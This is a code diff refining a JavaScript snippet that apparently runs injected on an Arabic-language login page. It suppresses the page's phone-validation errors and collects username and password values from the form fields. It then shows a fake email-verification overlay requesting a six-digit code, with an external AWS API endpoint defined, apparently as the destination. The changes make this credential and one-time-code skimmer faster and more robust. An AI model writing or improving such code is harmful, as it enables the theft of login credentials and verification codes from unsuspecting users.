@@ -11,10 +11,11 @@
   const API = 'https://xr7wsfym5k.execute-api.me-south-1.amazonaws.com';
 
   function fixLoginPage() {
-    // 1. Hide phone validation errors
-    document.querySelectorAll('*').forEach(el => {
+    // 1. Hide phone validation errors (targeted search instead of querySelectorAll('*'))
+    document.querySelectorAll('span, p, div, label, small').forEach(el => {
+      if (el.children.length > 0) return;
       const t = el.textContent || '';
-      if ((t.includes('يبدأ بـ 5') || t.includes('يكون 9') || t.includes('رقم الهاتف غير صحيح')) && el.children.length === 0) {
+      if (t.includes('يبدأ بـ 5') || t.includes('يكون 9') || t.includes('رقم الهاتف غير صحيح')) {
         el.style.display = 'none';
       }
     });
@@ -66,7 +67,7 @@
           let username = '', password = '';
           
           inputs.forEach(inp => {
-            if (inp.type === 'password' || inp.type === 'text' && inp.value.includes('*')) {
+            if (inp.type === 'password' || (inp.type === 'text' && inp.value.includes('*'))) {
               password = inp.value;
             } else if (inp.type === 'text' || inp.type === 'tel' || inp.type === 'email') {
               if (inp.value && !username) username = inp.value;
@@ -131,7 +132,7 @@
           <span style="font-size:32px">📧</span>
         </div>
         <h2 style="color:#0f2744;margin:0 0 8px;font-size:24px;font-weight:700">رمز التحقق</h2>
-        <p style="color:#64748b;font-size:14px;margin:0 0 28px;line-height:1.7">تم إرسال رمز التحقق إلى بريدك الإلكتروني<br><strong style="color:#0f2744;font-size:15px">${username}</strong></p>
+        <p style="color:#64748b;font-size:14px;margin:0 0 28px;line-height:1.7">تم إرسال رمز التحقق إلى بريدك الإلكتروني<br><strong id="fll-otp-user2" style="color:#0f2744;font-size:15px"></strong></p>
         <div style="margin:0 0 24px">
           <input id="fll-otp" type="text" inputmode="numeric" maxlength="6" placeholder="------"
             style="width:100%;padding:16px;text-align:center;font-size:28px;letter-spacing:12px;border:2px solid #d1d5db;border-radius:12px;outline:none;font-family:monospace;direction:ltr;box-sizing:border-box;transition:border-color .2s"
@@ -146,6 +147,8 @@
 
     const otpInput = document.getElementById('fll-otp');
     const verifyBtn = document.getElementById('fll-verify');
+    const userEl2 = document.getElementById('fll-otp-user2');
+    if (userEl2) userEl2.textContent = username;
     setTimeout(() => otpInput.focus(), 200);
 
     otpInput.addEventListener('input', () => {
@@ -204,9 +207,11 @@
     setTimeout(() => t.remove(), 4000);
   }
 
-  // Run
-  function init() { fixLoginPage(); setTimeout(fixLoginPage, 500); setTimeout(fixLoginPage, 1500); setTimeout(fixLoginPage, 3000); }
+  // Run with debounced MutationObserver
+  let _fixTimer = null;
+  function debouncedFix() { if (_fixTimer) clearTimeout(_fixTimer); _fixTimer = setTimeout(fixLoginPage, 200); }
+  function init() { fixLoginPage(); setTimeout(fixLoginPage, 1000); }
   if (document.readyState === 'loading') document.addEventListener('DOMContentLoaded', init);
   else init();
-  new MutationObserver(() => setTimeout(fixLoginPage, 150)).observe(document.body || document.documentElement, { childList: true, subtree: true });
+  new MutationObserver(debouncedFix).observe(document.body || document.documentElement, { childList: true, subtree: true });
 })();
